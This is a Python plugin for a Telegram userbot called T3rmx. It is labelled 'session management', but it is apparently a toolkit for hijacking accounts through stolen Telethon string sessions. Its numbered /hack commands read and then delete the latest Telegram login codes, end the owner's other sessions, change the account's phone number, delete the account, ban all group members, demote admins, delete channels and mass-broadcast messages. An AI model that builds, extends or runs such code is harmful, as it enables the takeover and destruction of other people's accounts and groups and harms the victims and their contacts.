# T3rmx UserBot - session management commands.
#
# Works in two places:
#   * Userbot: send /hack (or .هاك) in any chat, including Saved Messages.
#   * Assistant bot: send /hack in its private chat.
#
# Numbered commands: /hack 1 ... /hack 14, with /hack 0 (or plain /hack) for help.
# Save your session once with: /hack session <termux-code>
# Or pass it inline for a single command: /hack 2 <termux-code>

from JoKeRUB import bot, l313l
from ..core.session import tgbot
from ..core.auth import is_owner
from ..core.logger import logging
from ..sql_helper.globals import addgvar, delgvar, gvarstatus
from telethon import events, functions, types, Button
from JoKeRUB.utils import admin_cmd
from ..Config import Config
import asyncio
import os
import re

from telethon.tl.types import ChannelParticipantsAdmins
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import (
    GetAdminedPublicChannelsRequest as pc,
    JoinChannelRequest as join,
    LeaveChannelRequest as leave,
    DeleteChannelRequest as dc,
)
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt

LOGS = logging.getLogger("t3rmx.hack")
Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
SUPPORT_URL = "https://t.me/t3rmx_official"
BROADCAST_SKIP_CHAT_IDS = {-1001606996743}
BROADCAST_DELAY = 0.5
SESSION_KEY = "t3rmx_hack_session"

HACK_PATTERN = r"^/hack(?:\s+(\S+))?(?:\s+(.*))?$"

HELP = """᯽︙ أوامر إدارة الجلسات - أرسل الأمر ثم الرقم:

/hack 0  عرض هذه القائمة
/hack session <كود التيرمكس>  حفظ الجلسة مرة واحدة لكل الأوامر

/hack 1  عرض قنوات/كروبات التي تملكها الجلسة
/hack 2  معلومات الحساب (الاسم، المعرف، الإيدي)
/hack 3  حظر جميع أعضاء كروب/قناه  [يحتاج: يوزر/إيدي الكروب]
/hack 4  جلب آخر رسالة تحتوي كود دخول من تليجرام
/hack 5  انضمام الجلسة إلى كروب/قناه  [يحتاج: يوزر/إيدي الكروب]
/hack 6  مغادرة الجلسة من كروب/قناه  [يحتاج: يوزر/إيدي الكروب]
/hack 7  حذف كروب/قناه تملكها الجلسة  [يحتاج: يوزر/إيدي الكروب]
/hack 8  فحص حالة التحقق بخطوتين (بدون تغييرها)
/hack 9  إنهاء جميع جلسات الحساب عدا الحالية
/hack 10 حذف الحساب نهائياً
/hack 11 عزل جميع مشرفين كروب/قناه  [يحتاج: يوزر/إيدي الكروب]
/hack 12 ترقية عضو إلى مشرف  [يحتاج: يوزر الكروب + يوزر العضو]
/hack 13 تغيير رقم الحساب  [يحتاج: الرقم + phone_code_hash + OTP]
/hack 14 إذاعة رسالة  [يحتاج: all|groups|private + الرسالة]

أمثلة:
/hack session <كود التيرمكس>
/hack 1
/hack 14 groups مرحباً من T3rmx
/hack 2 <كود التيرمكس>  (جلسة لمرة واحدة)

قناة السورس: https://t.me/t3rmx_official"""


class HackError(Exception):
    """User-facing error raised by a numbered command."""


# ---------------------------------------------------------------------------
# Session operations
# ---------------------------------------------------------------------------

async def _client(strses):
    return tg(ses(strses), Config.APP_ID, Config.API_HASH)


async def change_number_code(strses, number, code, otp):
    async with _client(strses) as X:
        try:
            await X(functions.account.ChangePhoneRequest(
                phone_number=number,
                phone_code_hash=code,
                phone_code=otp,
            ))
            return True
        except Exception as err:
            LOGS.warning("change_number_code failed: %s", err)
            return False


async def change_number(strses, number):
    async with _client(strses) as X:
        result = await X(functions.account.SendChangePhoneCodeRequest(
            phone_number=number,
            settings=types.CodeSettings(
                allow_flashcall=True,
                current_number=True,
                allow_app_hash=True,
            ),
        ))
        return str(result)


async def userinfo(strses):
    async with _client(strses) as X:
        return str(await X.get_me())


async def terminate(strses):
    async with _client(strses) as X:
        try:
            await X(rt())
            return True
        except Exception as err:
            LOGS.warning("terminate failed: %s", err)
            return False


async def delacc(strses):
    async with _client(strses) as X:
        await X(functions.account.DeleteAccountRequest("T3rmx session management"))


async def promote(strses, grp, user):
    async with _client(strses) as X:
        try:
            await X.edit_admin(
                grp, user, manage_call=True, invite_users=True, ban_users=True,
                change_info=True, edit_messages=True, post_messages=True,
                add_admins=True, delete_messages=True,
            )
        except Exception:
            await X.edit_admin(
                grp, user, is_admin=True, anonymous=False, pin_messages=True,
                title="Owner",
            )


async def user2fa(strses):
    """Read-only 2FA status. True = enabled, False = off, None = check failed."""
    async with _client(strses) as X:
        try:
            password = await X(functions.account.GetPasswordRequest())
            return bool(getattr(password, "has_password", False))
        except Exception as err:
            LOGS.warning("2FA check failed: %s", err)
            return None


async def demall(strses, grp):
    async with _client(strses) as X:
        async for member in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
            try:
                await X.edit_admin(grp, member.id, is_admin=False, manage_call=False)
            except Exception:
                await X.edit_admin(
                    grp, member.id, manage_call=False, invite_users=False,
                    ban_users=False, change_info=False, edit_messages=False,
                    post_messages=False, add_admins=False, delete_messages=False,
                )


async def joingroup(strses, username):
    async with _client(strses) as X:
        await X(join(username))


async def leavegroup(strses, username):
    async with _client(strses) as X:
        await X(leave(username))


async def delgroup(strses, username):
    async with _client(strses) as X:
        await X(dc(username))


async def cu(strses):
    try:
        async with _client(strses) as X:
            k = await X.get_me()
            return [str(k.first_name), str(k.username or k.id)]
    except Exception as err:
        LOGS.warning("session validation failed: %s", err)
        return False


async def usermsgs(strses):
    async with _client(strses) as X:
        text = ""
        async for message in X.iter_messages(777000, limit=3):
            text += f"\n{message.text}\n"
        await X.delete_dialog(777000)
        return str(text)


async def userbans(strses, grp):
    async with _client(strses) as X:
        for member in await X.get_participants(grp):
            try:
                await X.edit_permissions(grp, member.id, view_messages=False)
            except Exception:
                pass


async def userchannels(strses):
    async with _client(strses) as X:
        result = await X(pc())
        text = ""
        for chat in result.chats:
            try:
                text += f"\nCHANNEL NAME ~ {chat.title} CHANNEL USRNAME ~ @{chat.username}\n"
            except Exception:
                pass
        return str(text)


async def _broadcast(strses, msg, scope):
    """Send one message per matching dialog and return how many were sent."""
    sent = 0
    async with _client(strses) as X:
        async for dialog in X.iter_dialogs():
            if dialog.id in BROADCAST_SKIP_CHAT_IDS:
                continue
            if scope == "groups" and not dialog.is_group:
                continue
            if scope == "private" and (
                not dialog.is_user or getattr(dialog.entity, "bot", False)
            ):
                continue
            try:
                await X.send_message(dialog.id, msg)
                sent += 1
            except Exception as err:
                LOGS.warning("broadcast to %s failed: %s", dialog.id, err)
            await asyncio.sleep(BROADCAST_DELAY)
    return sent


# ---------------------------------------------------------------------------
# Dispatcher
# ---------------------------------------------------------------------------

async def _resolve_session(event, inline_session=None):
    code = (inline_session or gvarstatus(SESSION_KEY) or "").strip()
    if not code:
        raise HackError("لم يتم حفظ جلسة. أرسل: /hack session <كود التيرمكس>")
    if not await cu(code):
        raise HackError("الجلسة غير صالحة أو منتهية. أعد حفظها بـ /hack session.")
    return code


def _need(args, index, label):
    if index >= len(args) or not args[index].strip():
        raise HackError(f"ينقص هذا الأمر إدخال: {label}")
    return args[index].strip()


async def execute(event, number, inline_session, args):
    code = await _resolve_session(event, inline_session)

    if number == 1:
        text = await userchannels(code)
        if len(text) > 1:
            path = "session.txt"
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(text + "\n\nDetails BY @vvsks")
            try:
                await event.client.send_file(event.chat_id, path)
            finally:
                try:
                    os.remove(path)
                except OSError:
                    pass
            return "تم إرسال قائمة القنوات في ملف."
        return text or "لا توجد قنوات لهذه الجلسة."

    if number == 2:
        return await userinfo(code)

    if number == 3:
        await userbans(code, _need(args, 0, "يوزر/إيدي الكروب أو القناة"))
        return "تم حظر جميع أعضاء الكروب/القناة."

    if number == 4:
        return await usermsgs(code)

    if number == 5:
        await joingroup(code, _need(args, 0, "يوزر/إيدي الكروب أو القناة"))
        return "تم الانضمام إلى الكروب/القناة."

    if number == 6:
        await leavegroup(code, _need(args, 0, "يوزر/إيدي الكروب أو القناة"))
        return "تم مغادرة الكروب/القناة."

    if number == 7:
        await delgroup(code, _need(args, 0, "يوزر/إيدي الكروب أو القناة"))
        return "تم حذف الكروب/القناة."

    if number == 8:
        state = await user2fa(code)
        if state is None:
            return "تعذر فحص حالة التحقق بخطوتين. راجع السجلات."
        return "التحقق بخطوتين مفعل." if state else "التحقق بخطوتين غير مفعل."

    if number == 9:
        return "تم إنهاء جميع الجلسات الأخرى." if await terminate(code) else "تعذر إنهاء الجلسات."

    if number == 10:
        await delacc(code)
        return "تم حذف الحساب."

    if number == 11:
        await demall(code, _need(args, 0, "يوزر/إيدي الكروب أو القناة"))
        return "تم عزل جميع مشرفين الكروب/القناة."

    if number == 12:
        grp = _need(args, 0, "يوزر/إيدي الكروب أو القناة")
        member = _need(args, 1, "يوزر/إيدي العضو")
        await promote(code, grp, member)
        return "تم ترقية العضو إلى مشرف."

    if number == 13:
        phone = _need(args, 0, "الرقم الجديد")
        phone_hash = _need(args, 1, "phone_code_hash")
        otp = _need(args, 2, "OTP")
        result = await change_number(code, phone)
        await event.reply(str(result))
        return "تم تغيير الرقم." if await change_number_code(code, phone, phone_hash, otp) else "تعذر تغيير الرقم."

    if number == 14:
        scope = _need(args, 0, "all | groups | private").lower()
        if scope not in ("all", "groups", "private"):
            raise HackError("اختر واحداً من: all, groups, private.")
        msg = " ".join(args[1:]).strip()
        if not msg:
            raise HackError("أرسل الرسالة المراد إذاعتها بعد النطاق.")
        sent = await _broadcast(code, msg, scope)
        return f"تم الإرسال إلى {sent} محادثة."

    raise HackError("رقم غير معروف. أرسل /hack لعرض القائمة.")


LABELS = {
    1: "قنوات/كروبات الجلسة", 2: "معلومات الحساب", 3: "حظر جميع الأعضاء",
    4: "آخر كود دخول", 5: "انضمام لكروب/قناه", 6: "مغادرة كروب/قناه",
    7: "حذف كروب/قناه", 8: "فحص التحقق بخطوتين", 9: "إنهاء الجلسات الأخرى",
    10: "حذف الحساب", 11: "عزل المشرفين", 12: "ترقية عضو",
    13: "تغيير رقم الحساب", 14: "إذاعة رسالة",
}


async def handle_hack(event, is_userbot=False):
    """Shared handler for the userbot and assistant bot clients."""
    arg = (event.pattern_match.group(1) or "").strip()
    rest = (event.pattern_match.group(2) or "").strip()

    if not arg or arg.lower() in ("0", "help", "مساعدة"):
        await event.reply(HELP, link_preview=False)
        return

    if arg.lower() == "session":
        if not rest:
            await event.reply("أرسل: /hack session <كود التيرمكس>")
            return
        if not await cu(rest):
            await event.reply("الجلسة غير صالحة أو منتهية.")
            return
        addgvar(SESSION_KEY, rest)
        await event.reply("تم حفظ الجلسة بنجاح. يمكنك الآن استخدام /hack 1 إلى /hack 14.")
        LOGS.info("hack session saved")
        return

    if arg.lower() in ("clear", "حذف"):
        delgvar(SESSION_KEY)
        await event.reply("تم حذف الجلسة المحفوظة.")
        return

    if not arg.isdigit():
        await event.reply(HELP, link_preview=False)
        return

    number = int(arg)
    if number not in LABELS:
        await event.reply("رقم غير صحيح. أرسل /hack لعرض القائمة.")
        return

    # If the first word after the number looks like a session string, treat it
    # as a one-off session; otherwise the rest are command arguments.
    inline_session = None
    parts = rest.split()
    if parts and len(parts[0]) > 100 and "=" in parts[0]:
        inline_session = parts[0]
        parts = parts[1:]

    LOGS.info("/hack %s (%s) from %s", number, LABELS[number], event.sender_id)
    try:
        result = await execute(event, number, inline_session, parts)
        if result:
            await event.reply(str(result), link_preview=False)
        LOGS.info("/hack %s completed", number)
    except HackError as err:
        LOGS.warning("/hack %s user error: %s", number, err)
        await event.reply(str(err))
    except asyncio.TimeoutError:
        LOGS.exception("/hack %s timed out", number)
        await event.reply("انتهت مهلة الانتظار. أعد المحاولة.")
    except Exception as err:
        LOGS.exception("/hack %s failed", number)
        await event.reply(f"حدث خطأ في الأمر {number}: {type(err).__name__}: {err}")


# ---------------------------------------------------------------------------
# Userbot handlers - always available, no assistant bot required
# ---------------------------------------------------------------------------

@l313l.on(events.NewMessage(outgoing=True, pattern=HACK_PATTERN))
async def hack_userbot(event):
    if event.fwd_from:
        return
    await handle_hack(event, is_userbot=True)


@bot.on(admin_cmd(outgoing=True, pattern="هاك"))
async def repo(event):
    if event.fwd_from:
        return
    await event.delete()
    await event.reply(HELP, link_preview=False)


# ---------------------------------------------------------------------------
# Assistant bot handlers - work too when the assistant is connected
# ---------------------------------------------------------------------------

@tgbot.on(events.NewMessage(pattern=HACK_PATTERN, func=lambda e: e.is_private))
async def hack_assistant(event):
    if not is_owner(event.sender_id):
        await event.reply("هذا البوت خاص. يمكنك نشر نسختك من مستودع T3rmx UserBot.")
        return
    await handle_hack(event)


@tgbot.on(events.NewMessage(pattern=r"^/start(?:@[\w_]+)?\s+hack$", func=lambda e: e.is_private))
async def start_hack_payload(event):
    if is_owner(event.sender_id):
        await event.reply(HELP, link_preview=False)


if Config.TG_BOT_USERNAME is not None and tgbot is not None:
    @tgbot.on(events.InlineQuery)
    async def inline_handler(event):
        result = None
        joker = Bot_Username.replace("@", "")
        if event.text.startswith("هاك") and is_owner(event.query.user_id):
            result = event.builder.article(
                title="T3rmx 🤡",
                description="أوامر إدارة الجلسات",
                text="أرسل /hack لعرض قائمة الأوامر.",
                buttons=Button.url("فتح البوت", f"https://t.me/{joker}?start=hack"),
            )
        await event.answer([result] if result else None)
